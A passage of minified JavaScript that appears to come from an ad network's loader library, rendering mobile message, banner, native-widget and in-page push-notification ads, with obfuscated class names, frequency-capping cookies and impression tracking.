          a = "#exo-mobile-im-container-wrapper {    height: 0px;    display: none;    visibility: hidden;    background: none repeat scroll 0 0 rgba(226, 226, 226, 0.8) !important;    bottom: 0 !important;    left: 0 !important;    position: fixed !important;    text-align: center; width: 100%;    z-index: 1999900 !important;    transition: height 1s ease-in-out 0s;    -webkit-transition: height 1s ease-in-out 0s;    -o-transition: height 1s ease-in-out 0s;    -moz-transition: height 1s ease-in-out 0s;    -ms-transition: height 2s ease-in-out 0s;}#exo-mobile-im-container {    position: relative;    min-width: 150px;    width: 100%;    height: 0px;    max-width: 300px;    margin: 0 auto;}#exo-mobile-im-close-button {    height: 24px;    width: 24px;    float: right;    top: -12px;    right: -12px;    position: relative;    z-index: 1999999 !important;    cursor: pointer;}#exo-mobile-im-content {    border:none;    overflow:hidden;    position: relative;    top:-24px;    width: 300px;    height: 100px;    cursor: pointer;}";
        a = e.scrambleStyleString(a, t), d.innerHTML = a, i.placeholder.appendChild(d), i.placeholder.parentNode.appendChild(o), m.push(i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-content", t)));
      }(), window.setTimeout(function () {
        i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-container-wrapper", t)).style.display = "block", i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-container-wrapper", t)).style.visibility = "visible", window.setTimeout(function () {
          i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-container-wrapper", t)).style.height = "100px";
        }, 100);
        var n = i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-close-button", t));
        n.addEventListener("mousedown", p, !0), n.addEventListener("touchstart", p, !0), n.addEventListener("mouseup", p, !0), n.addEventListener("touchend", p, !0), null != (n = i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-content", t))) && (n.addEventListener("mouseup", f), n.addEventListener("touchend", f), n.addEventListener("mousedown", f), n.addEventListener("touchstart", f));
      }, 500), a && (s += 1, e.setCookie("zone-cap-" + o, s, 360));
      return m;
      function p(r) {
        if (r.stopPropagation(), r.preventDefault(), i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-container-wrapper", t)).style.display = "none", c = !0, a) {
          var d = parseInt(n.frequency_period, 10);
          isNaN(d) && (d = 0), e.setCookie(exoDynamicParams.zoneClosedCookiePrefix + o, c, d, "." + i.doc_reference.location.hostname);
        }
        "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o);
      }
      function f(e) {
        e.stopPropagation();
      }
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.MobileInstantMessageContainerRenderer = {
      render: function (e, o, i) {
        RendererApi.validateRenderArguments(e, o, "mobile-instant-message"), "boolean" != typeof i && (i = !1);
        var t = exoDynamicParams.closeImgCircle;
        return e.dom = {
          placeholder: o,
          doc_reference: document
        }, n(e.data, e.idzone, e.dom, {}, t, !1, i);
      }
    });
  }();
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("banner", "content", function (i, r, o) {
        null != e && (r.data.image = e.formatImage(i, r.data.image), r.data.url = e.formatLink(i, r.data.url), r.data.optimum_image && ExoSupport.supported("webp") && (r.data.optimum_image = e.formatImage(i, r.data.optimum_image)), o.parentElement.style.display = "inline-flex", t(r.data, r.dom, o));
      });
    } catch (e) {
      console.log("banner renderer failed with error: " + e.message);
    }
    function t(t, i, r) {
      var o = function (e, t) {
          if (void 0 !== e.width && (t.setAttribute("width", "100%"), t.setAttribute("max-width", e.width + "px")), void 0 !== e.height) {
            const i = "html_banner" === e.media ? "100%" : "auto";
            t.setAttribute("height", i), t.setAttribute("max-height", e.height + "px");
          }
        },
        a = function (e, t) {
          var i = e.doc_reference.createElement("video");
          o(t, i), i.setAttribute("loop", !0), i.setAttribute("muted", !0), i.muted = !0, i.setAttribute("autoplay", !0), i.setAttribute("playsinline", !0), i.setAttribute("preload", "auto");
          var a = e.doc_reference.createElement("source");
          t.optimum_image ? a.setAttribute("src", t.optimum_image) : a.setAttribute("src", t.video), i.appendChild(a), r.appendChild(i);
        },
        n = function (t, i, o) {
          var a;
          r.onclick = (a = i, function (t) {
            e.openLink(t, a, void 0, o);
          });
        };
      t.media && "img_banner" !== t.media ? "html_banner" === t.media ? function (e, t) {
        var i = e.doc_reference.createElement("iframe");
        o(t, i), i.setAttribute("sandbox", "allow-forms allow-pointer-lock allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts"), i.setAttribute("frameborder", "0"), i.setAttribute("scrolling", "no"), i.setAttribute("marginwidth", "0"), i.setAttribute("marginheight", "0"), r.appendChild(i);
        var a = i.contentWindow.document;
        a.open(), a.write('<body style="margin:0px;">' + t.html + "</body>"), a.close();
      }(i, t) : "video_banner" === t.media && (a(i, t), n(0, t.url, !0)) : (t.optimum_image && !0 === t.is_video || t.optimum_image && void 0 === t.is_video && "webp" !== t.optimum_image.split(".").pop() ? a(i, t) : function (e, t) {
        var i = e.doc_reference.createElement("img");
        o(t, i), i.src = t.optimum_image && ExoSupport.supported("webp") ? t.optimum_image : t.image, r.appendChild(i);
      }(i, t), n(0, t.url));
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.BannerRenderer = {
      render: function (e, i) {
        RendererApi.validateRenderArguments(e, i, "banner"), e.dom = {
          placeholder: i,
          doc_reference: document
        }, t(e.data, e.dom, i), RendererApi.trackImpression(e.data.impression, e.idzone, void 0, !0);
      }
    });
  }();
  tracker.setupEventListeners();
  !function () {
    try {
      var e,
        t = {},
        i = /\.(exo-native[a-zA-Z\-_]+)/g,
        n = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != n && n.registerRenderer("native", "content", function (t, i, a) {
        if (null != n && void 0 !== i) {
          var d = ["branding_logo", "branding_logo_hover"];
          n.isNeverblock && (i.data.ad_items = i.data.data, delete i.data.data);
          for (var r = i.idzone, m = 0; m < d.length; m++) {
            var g = d[m];
            void 0 !== i.data.layout[g] && "" !== i.data.layout[g] && (i.data.layout[g] = n.formatImage(t, i.data.layout[g]));
          }
          for (var s = 0; s < i.data.ad_items.length; s++) i.data.ad_items[s].image = n.formatImage(t, i.data.ad_items[s].image), i.data.ad_items[s].url = n.formatLink(t, i.data.ad_items[s].url);
          e = "exo-native-widget-" + r + "-" + l(5), a.style = "display: inherit", a.appendChild(_(i.data)), o(i.data);
        }
      });
    } catch (e) {
      console.log("native renderer failed with error: " + e.message);
    }
    function o(e) {
      var i;
      function o() {
        i = document.querySelector("." + n.getRandomizedReference("exo-native-widget-outer-container", t));
        var a,
          r = document.querySelector("." + n.getRandomizedReference("exo-native-widget-item-image-wrapper", t));
        for (i && r || setTimeout(function () {
          return o();
        }, 100), a = 0; a < i.length; a++) {
          var l = i[a];
          if (l.clientHeight < 10) {
            var _ = d(l.children[0].clientHeight).mult(e.mobile_rows).px();
            i[a].style.height = "auto", i[a].style.minHeight = _;
          }
        }
        for (a = 0; a < r.length; a++) r[a].style.height = "auto";
      }
      setTimeout(function () {
        return !0;
      }, 3e3), setTimeout(function () {
        return o();
      }, 100);
    }
    function a(e) {
      this.float = function (e) {
        return e = "boolean" == typeof e ? +e : e, isNaN(parseFloat(e)) ? 0 : parseFloat(e);
      }, this.sum = function (e) {
        return this.set(this.v + this.float(e)), this;
      }, this.sub = function (e) {
        return this.set(this.v - this.float(e)), this;
      }, this.mult = function (e) {
        return this.set(this.v * this.float(e)), this;
      }, this.div = function (e) {
        return this.set(this.v / this.float(e)), this;
      }, this.concat = function (e) {
        return this.s.indexOf(e) < 0 && this.set(this.s + e.toString()), this;
      }, this.px = function () {
        return this.concat("px").s;
      }, this.perc = function () {
        return this.concat("%").s;
      }, this.get = function () {
        return this.v;
      }, this.string = function () {
        return this.s;
      }, this.set = function (e) {
        e = e || 0, this.v = this.float(e), this.s = e.toString();
      }, this.set(e);
    }
    function d(e) {
      return new a(e);
    }
    function r(e) {
      return new a(+e).get() || "string" == typeof e && e.toString().length > 1 ? "block" : "none";
    }
    function l(e, t) {
      for (var i = "", n = t || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", o = 0; o < e; o++) i += n.charAt(Math.floor(Math.random() * n.length));
      return i;
    }
    function _(o, a) {
      var l,
        _,
        c,
        x,
        p,
        h = document.createElement("div");
      h.id = n.getRandomizedReference(e, t), h.className = n.getRandomizedReference("exo-native-widget", t), h.appendChild(function (o) {
        var a = document.createElement("style");
        o = function (t) {
          t.is_mobile ? (t.text_position = t.mobile_text_position, t.text_box_size = t.mobile_text_box_size, t.image_width = t.mobile_image_width, t.image_height = t.mobile_image_height, t.rows = t.mobile_rows, t.cols = t.mobile_cols) : (t.rows = t.itemsPerCol, t.cols = t.itemsPerRow);
          var i = "right" === t.text_position,
            n = "native-exit" === t.publisherAdType,
            o = t.is_mobile ? d(t.mobile_text_enabled).get() : d(t.text_enabled).get();
          if (t.text_position = "" !== t.text_position && t.text_position ? t.text_position : "bottom", t.zone_id_prefix = "#" + e, t.calculated_item_width = 100 / t.cols + "%", t.item_title_display = r(t.title_enabled), t.item_description_display = r(t.description_enabled), t.item_brand_display = r(t.brand_enabled), t.string_image_border_style = t.image_border_size && t.image_border_color ? d("border:").concat(d(t.image_border_size).px()).concat(" solid ").concat(t.image_border_color).concat(";").string() : "", t.header_justify_content = {
            right: "flex-end",
            left: "flex-start",
            center: "center"
          }[t.header_text_align], t.flex_direction = {
            right: "row",
            bottom: "column"
          }[t.text_position], t.text_absolute = {
            right: "absolute",
            bottom: "initial"
          }[t.text_position], t.zoom = d(t.zoom).get() ? 105 : 100, t.mobile_rows = d(t.mobile_rows || 1).get(), t.mobile_cols = d(t.mobile_cols || 2).get(), t.breakpoint = d(t.mobile_breakpoint).px(), t.mobile_text_box_size = d(t.mobile_text_box_size).px(), t.header_display = r(t.branding_logo), t.spacing_h = d(t.spacing_h).px(), t.spacing_v = d(t.spacing_v).px(), t.zoomOut = d(t.image_height).get() > d(t.image_width).get() ? "auto 100%" : "100% auto", t.zoomIn = t.zoomOut.replace("100%", d(t.zoom).perc()), t.text_display = r(t.text_box_size), t.aspect_ratio = d(t.image_height).div(t.image_width).mult(100).perc(), t.widget_width = d(t.widget_width).px(), t.header_padding_position = d(t.header_is_on_top).get() ? "bottom" : "top", t.text_box_size = d(o ? t.text_box_size : 0).px(), t.text_box_size_flex = "initial", t.image_size_flex = "initial", i) {
            var a = t.is_mobile ? 2.5 : 1,
              l = d(t.image_width).mult(a).sum(t.item_padding).px();
            t.text_box_size = d(o ? l : 0).px(), t.widget_width_calc = d(t.image_width).sum(t.text_box_size).mult(t.cols).px(), t.widget_min_width = d(t.text_box_size).mult(2).mult(t.cols).sub(t.spacing_v).px(), t.image_wrapper_width = d("calc(100% - ").concat(t.text_box_size).concat(")").string(), t.text_max_width = d(t.text_box_size).px(), t.text_max_height = d(t.image_height).px(), t.text_width = d(t.text_box_size).px(), t.text_height = "auto", t.text_padding_left = d(t.item_padding).px(), t.text_padding_top = d(0).px(), t.image_size_flex = 1, t.text_box_size_flex = a, o && (t.text_max_width = t.is_mobile ? "initial" : t.text_max_width, t.text_absolute = "initial");
          } else t.text_box_size = d(o ? 90 : 0).px(), t.widget_width_calc = d(t.image_width).mult(t.cols).px(), t.widget_min_width = "auto", t.image_wrapper_width = d(100).perc(), t.text_max_width = d(100).perc(), t.text_max_height = d(t.text_box_size).px(), t.text_width = d(100).perc(), t.text_height = d(t.text_box_size).px(), t.text_padding_left = d(0).px(), t.text_padding_top = d(t.item_padding).px();
          var _ = d(t.spacing_h).mult(d(t.cols).sub(1).get()).get();
          return t.widget_width_calc = d(t.widget_width_calc).sum(_).px(), t.widget_min_width = d(100).sum(_).px(), d(t.widget_width) > 0 && (t.widget_width_calc = d(t.widget_width).px()), t.max_items = d(t.cols).mult(t.rows).sum(1).get(), t.max_items_mobile = d(t.mobile_rows).mult(t.mobile_cols).sum(1).get(), t.is_mobile && (t.widget_min_width = d(50).px(), t.max_items = t.max_items_mobile), n && (t.widget_min_width = d(100).perc()), void 0 !== t.header_enabled && 0 === d(t.header_enabled).get() && (t.widgetHeaderContentHtml = ""), t;
        }(o);
        var l = '{{zone_id_prefix}}.exo-native-widget , /* required space between class and comma because of regex from frontend loader*/{{zone_id_prefix}}.exo-native-widget * {    box-sizing: border-box;}{{zone_id_prefix}}.exo-native-widget {    background-color: {{widget_background_color}};    overflow: hidden;    max-width: 100%;    width: {{widget_width_calc}};    min-width: {{widget_min_width}};    display: inline-flex;    flex-direction: column;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-header {    width: initial !important;    float: initial !important;    white-space: nowrap;    font-family: {{font_family}};    font-size: {{header_font_size}};    color: {{header_font_color}};    display: {{header_display}};    padding-{{header_padding_position}}: 15px;    line-height: 15px;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-header a {    display: flex;    justify-content: {{header_justify_content}};    color: inherit;    text-decoration: none;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-header a span {    display: flex;    height: 14px;    width: 47px;    margin-left: 4px;    background: rgba(0, 0, 0, 0) url("{{branding_logo}}") repeat scroll 0 0 / 47px 14px;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-header a:hover span {    background: rgba(0, 0, 0, 0) url("{{branding_logo_hover}}") repeat scroll 0 0 / 47px 14px;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container {    display: flex;    flex-wrap: wrap;    height: 100%;    align-content: space-between;    margin-bottom: -{{spacing_v}};    margin-right: -{{spacing_h}};}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container {    overflow: hidden;    flex-basis: calc(100%/{{cols}});    position: relative;    padding-right: {{spacing_h}};    padding-bottom: {{spacing_v}};}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item , /* required space between class and comma because of regex from frontend loader*/a.exo-native-widget-item:visited {    text-decoration: none;    font-family: {{font_family}};    font-size:  {{header_font_size}};    color: {{header_font_color}};    overflow: hidden;    display: flex;    position: relative;    flex-direction: {{flex_direction}};}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-image-wrapper {    position: relative;    float: left;    width: {{image_wrapper_width}};    min-width: auto;    z-index: 2;    flex: {{image_size_flex}};    height: 100%;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-image-ratio {    width: 100%;    padding-top: {{aspect_ratio}};    z-index: 1;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-image {    background-repeat: no-repeat;    background-size: {{zoomOut}};    {{string_image_border_style}}    position: absolute;    top: 0;    left: 0;    width: 100%;    height: 100%;    transition: background-size 0.3s;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-image:hover {    background-size: {{zoomIn}};}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content {    max-width: {{text_max_width}};    max-height: {{text_max_height}};    overflow: hidden;    position: {{text_absolute}};    right: 0;    top: 0;    width: {{text_width}};    height: {{text_height}};    padding-left: {{text_padding_left}};    padding-right: 0;    padding-top: {{text_padding_top}};    padding-bottom: 0;    display: {{text_display}};    text-align: {{text_align}};    flex: {{text_box_size_flex}};    position: relative;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-content-box {    position: absolute;    width: 100%;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-title {    font-family: {{font_family}};    font-size: {{title_font_size}};    color: {{title_font_color}};    font-weight: {{title_font_weight}};    text-decoration: {{title_decoration}};    display: {{item_title_display}};    transition: color 0.16s;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-text {     font-family: {{font_family}};    font-size: {{description_font_size}};    color: {{description_font_color}};    font-weight: {{description_font_weight}};    text-decoration: {{description_decoration}};    display: {{item_description_display}};    transition: color 0.16s;}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-brand {     font-family: {{font_family}};    font-size: {{brand_font_size}};    color: {{brand_font_color}};    font-weight: {{brand_font_weight}};    text-decoration: {{brand_decoration}};    display: {{item_brand_display}};}/* Hover section below: */{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-title:hover {    color: {{title_hover_color}};    font-weight: {{title_hover_font_weight}};    text-decoration: {{title_hover_decoration}};}{{zone_id_prefix}}.exo-native-widget .exo-native-widget-outer-container .exo-native-widget-item-container a.exo-native-widget-item .exo-native-widget-item-content .exo-native-widget-item-text:hover {     color: {{description_hover_color}};    font-weight: {{description_hover_font_weight}};    text-decoration: {{description_hover_decoration}};}@media all and (max-width: {{mobile_breakpoint}}px) {    {{zone_id_prefix}}.exo-native-widget     .exo-native-widget-outer-container     .exo-native-widget-item-container:nth-child(n+{{max_items_mobile}}) {         display: none;    }        {{zone_id_prefix}}.exo-native-widget     .exo-native-widget-outer-container     .exo-native-widget-item-container {         flex-basis: calc(100%/{{mobile_cols}});    }}',
          _ = null;
        for (var m in o) Object.prototype.hasOwnProperty.call(o, m) && (_ = new RegExp("{{" + m + "}}", "g"), l = l.replace(_, o[m]));
        return l = n.scrambleStyleString(l, t, i), a.innerHTML = l, a;
      }(o.layout)), o.layout.mobile_responsive_type && h.appendChild((l = o.layout.minimum_width_for_full_sized_layout, _ = "#" + n.getRandomizedReference(e, t), c = document.createElement("style"), x = "@media all and (max-width: " + l + ") {    " + _ + ".exo-native-widget {        width: 100% !important;        height: auto !important;    }    " + _ + ".exo-native-widget .exo-native-widget-item-container {        clear: both;        width: 100% !important;        max-width: 100% !important;        margin-left: 0 !important;    }    " + _ + ".exo-native-widget .exo-native-widget-item-outer-container {        width: 100% !important;    }    " + _ + ".exo-native-widget .exo-native-widget-item .exo-native-widget-item-image {        width: 100% !important;        max-width: 100% !important;        margin: auto !important    }    " + _ + ".exo-native-widget .exo-native-widget-item-container .exo-native-widget-item .exo-native-widget-item-content {        max-width: 100% !important;    }    " + _ + ".exo-native-widget .exo-native-widget-item-container .exo-native-widget-item {        margin: 0 auto !important;    }}", x = n.scrambleStyleString(x, t, i), c.innerHTML = x, c)), o.layout.customcss_enabled && h.appendChild(function (o) {
        var a = document.createElement("style"),
          d = o.replace(/ *(:|;|{|}) */g, "$1").replace(/\/\*([^*]|[\r\n]|(\*+([^*/]|[\r\n])))*\*\/+/g, "").split("}").filter(function (e) {
            return e.trim().length > 0;
          }).map(function (t) {
            return "#" + e + ".exo-native-widget " + t;
          }).join("} ") + "}";
        return d = n.scrambleStyleString(d, t, i), a.innerHTML = d, a;
      }(o.layout.customcss)), g() && h.appendChild(((p = document.createElement("script")).setAttribute("type", "application/javascript"), scriptString = 'function setRealHref(e) {var caller = e.currentTarget || e.srcElement; caller.setAttribute("href", caller.getAttribute("real-href"));}', p.innerHTML = scriptString, p)), o.layout.header_enabled && o.layout.header_is_on_top && h.appendChild(s(o.layout.widgetHeaderContentHtml));
      var w = document.createElement("div");
      w.className = n.getRandomizedReference("exo-native-widget-outer-container", t), h.appendChild(w);
      for (var v = 0; v < o.ad_items.length; v++) w.appendChild(m(o.ad_items[v], o.layout.open_in_new_window));
      return o.layout.header_enabled && !o.layout.header_is_on_top && h.appendChild(s(o.layout.widgetHeaderContentHtml)), h;
    }
    function m(e, i) {
      var o = document.createElement("div");
      o.className = n.getRandomizedReference("exo-native-widget-item-container", t);
      var a = document.createElement("a");
      a.className = n.getRandomizedReference("exo-native-widget-item", t), g() ? (a.setAttribute("href", ""), a.setAttribute("real-href", e.url), a.setAttribute("oncontextmenu", "setRealHref(event)"), a.setAttribute("onmouseup", "setRealHref(event)")) : a.href = e.url, a.setAttribute("rel", "nofollow"), i && a.setAttribute("target", "_blank");
      var d = null;
      if ("native_iframe_link" === e.format) (d = document.createElement("iframe")).src = e.iframe_url;else {
        d = document.createElement("div");
        var r = e.optimum_image && ExoSupport.supported("webp") ? e.optimum_image : e.image;
        d.style.backgroundImage = 'url("' + r + '")', d.style.backgroundPosition = e.image_position;
      }
      d.className = n.getRandomizedReference("exo-native-widget-item-image", t);
      var l = document.createElement("div");
      l.className = n.getRandomizedReference("exo-native-widget-item-image-wrapper", t), l.appendChild(d);
      var _ = document.createElement("div");
      _.className = n.getRandomizedReference("exo-native-widget-item-image-ratio", t), l.appendChild(_), a.appendChild(l);
      var m = document.createElement("div");
      m.className = n.getRandomizedReference("exo-native-widget-item-content", t);
      var s = document.createElement("div");
      s.className = n.getRandomizedReference("exo-native-widget-item-title", t), s.innerHTML = e.title, m.appendChild(s);
      var c = document.createElement("div");
      c.className = n.getRandomizedReference("exo-native-widget-item-text", t), c.innerHTML = e.description, m.appendChild(c);
      var x = document.createElement("div");
      return x.className = n.getRandomizedReference("exo-native-widget-item-brand", t), x.innerHTML = e.brand, m.appendChild(x), a.appendChild(m), o.appendChild(a), o;
    }
    function g() {
      return !(window.attachEvent && !window.addEventListener);
    }
    function s(e) {
      var i = document.createElement("div");
      return i.className = n.getRandomizedReference("exo-native-widget-header", t), exoDynamicParams.showBranding && (i.innerHTML = e), i;
    }
    "undefined" != typeof RendererApi && (void 0 === n && (n = RendererApi), window.NativeRenderer = {
      render: function (t, i) {
        RendererApi.validateRenderArguments(t, i, "native"), e = "exo-native-widget-" + t.idzone + "-" + l(5), i.style = "display: inherit", i.appendChild(_(t.data, t.idzone)), o(t.data);
        for (var n = 0; n < t.data.ad_items.length; n++) {
          var a = t.data.ad_items[n];
          void 0 !== a.impression && RendererApi.trackImpression(a.impression, t.idzone, n, !0);
        }
      }
    });
  }();
  !function () {
    try {
      var i = "undefined" != typeof AdProvider && null !== AdProvider ? AdProvider : void 0,
        e = "zone-cap-",
        o = exoDynamicParams.zoneClosedCookiePrefix,
        t = 360,
        n = 96,
        a = 96,
        p = 4 * n,
        r = a,
        s = 20;
      null != i && i.registerRenderer("in-page-push-notification", "content", function (e, o, t, n) {
        null != i && c(o, t, n);
      });
    } catch (i) {
      console.log("in-page-push-notification renderer failed with error: " + i.message);
    }
    "undefined" != typeof RendererApi && (void 0 === i && (i = RendererApi), window.InPagePushNotificationRenderer = {
      render: function (i, e, o) {
        RendererApi.validateRenderArguments(i, e, "in-page-push-notification"), "boolean" != typeof o && (o = !1), void 0 === i.data.notificationDisplayedCount && (i.data.notificationDisplayedCount = 0), i.dom = {
          doc_reference: document
        }, c(i, e, o);
      }
    });
    var c = function (c, d, l) {
      for (var m = {}, x = c.idzone, g = c.dom, f = c.data, u = f.horizontal_position, b = f.vertical_position, h = isNaN(f.delay) ? 0 : parseInt(f.delay), v = isNaN(f.max_notifications_on_page) ? 1 : parseInt(f.max_notifications_on_page), w = isNaN(f.once_closed_hide_for) ? 10 : parseInt(f.once_closed_hide_for), y = isNaN(f.user_session_capping) ? 0 : parseInt(f.user_session_capping), k = isNaN(f.delay_between_notifications) ? 10 : parseInt(f.delay_between_notifications), _ = f.notificationDisplayedCount, N = ".exo-ipp-container {    width: " + p + "px;    height: " + r + "px;    display: flex;    display: -webkit-box;    display: -moz-box;    display: -ms-flexbox;    display: -webkit-flex;    background: white;    border-radius: 10px;    margin: " + s + "px;    cursor: pointer;    z-index: 9999999999999;    position: fixed;    color: initial;}.exo-ipp-container.h-left {    left: 0px;}.exo-ipp-container.h-right {    right: 0px;}.exo-ipp-container.h-center {    left: 50%;    margin-left: {{horizontalPositionCenterMarginLeft}};}.exo-ipp-container.v-top {    top: 0px;}.exo-ipp-container.v-bottom {    bottom: 0px;}.exo-ipp-container.v-middle {    top: 50%;    margin-top: {{verticalPositionMiddleMarginTop}};}.exo-ipp-container.second-notification,.exo-ipp-container.second-notification.mobile  {    margin-bottom: " + (2 * s + a) + "px;}.exo-ipp-container.second-notification.v-top{    margin-top: " + (2 * s + a) + "px;}.exo-ipp-container.second-notification.v-middle{    margin-top: " + (2 * s + a) + "px;    margin-top: {{secondNotificationVerticalPositionMiddleMarginTop}}px;}.exo-ipp-container.mobile {    width: initial;    left: 0px;    right: 0px;    margin-left: " + s + "px;    margin-right: " + s + "px;    margin-bottom: " + s + "px;}.exo-ipp-image {    width: " + n + "px;    height: " + a + "px;    background: rgba(219, 218, 215, 0.9);    border-radius: 10px 0px 0px 10px;    flex-shrink: 0;}.exo-ipp-text-container {    display: flex;    display: -webkit-box;    display: -moz-box;    display: -ms-flexbox;    display: -webkit-flex;    flex-direction: column;    -ms-flex-direction: row;    -webkit-flex-direction: column;    justify-content: center;    -webkit-justify-content: center;    -ms-flex-pack: center;    margin-left: 16px;    width: 100%;}.exo-ipp-title {    font-weight: bold;}.exo-ipp-description {}.exo-ipp-close-button-container{    margin-top: 7px;    margin-right: 7px;    margin-left: 7px;    align-self: start;    -ms-flex-item-align: center;    background: black;    border-radius: 50%;    padding: 5px;    width: 28px;    height: 28px;    box-sizing: border-box; }.exo-ipp-close-button {    width: 18px;    height: 18px;}", z = "", P = d.getElementsByClassName("exo-ipp-container"), C = 0; C < P.length; C++) if ("none" !== P[C].parentElement.style.display) {
        z = " second-notification";
        break;
      }
      var M,
        R,
        A = " h-" + u + " v-" + b + z,
        E = '<div class="exo-ipp-container' + (A += (R = !1, M = navigator.userAgent || navigator.vendor || window.opera, (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino|android|ipad|playbook|silk/i.test(M) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw-(n|u)|c55\/|capi|ccwa|cdm-|cell|chtm|cldc|cmd-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc-s|devi|dica|dmob|do(c|p)o|ds(12|-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(-|_)|g1 u|g560|gene|gf-5|g-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd-(m|p|t)|hei-|hi(pt|ta)|hp( i|ip)|hs-c|ht(c(-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i-(20|go|ma)|i230|iac( |-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|-[a-w])|libw|lynx|m1-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|-([1-8]|c))|phil|pire|pl(ay|uc)|pn-2|po(ck|rt|se)|prox|psio|pt-g|qa-a|qc(07|12|21|32|60|-[2-7]|i-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h-|oo|p-)|sdk\/|se(c(-|0|1)|47|mc|nd|ri)|sgh-|shar|sie(-|m)|sk-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h-|v-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl-|tdg-|tel(i|m)|tim-|t-mo|to(pl|sh)|ts(70|m-|m3|m5)|tx-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas-|your|zeto|zte-/i.test(M.substr(0, 4))) && (R = !0), R ? " mobile" : "")) + '">                <img class="exo-ipp-image" src="' + (f.optimum_image && "undefined" != typeof ExoSupport && ExoSupport.supported("webp") ? f.optimum_image : f.image) + '" >                <div class="exo-ipp-text-container">                    <div class="exo-ipp-title">' + f.title + '</div>                    <div class="exo-ipp-description">' + f.description + '</div>                </div>                <div class="exo-ipp-close-button-container">                    <img class="exo-ipp-close-button" src="' + exoDynamicParams.closeImg + '">                </div>            </div>',
        I = function (e, t, n) {
          e.stopPropagation(), e.preventDefault(), t.style.display = "none";
          var a = o + n + "-" + x;
          l && i.setCookie(a, !0, w, "." + g.doc_reference.location.hostname);
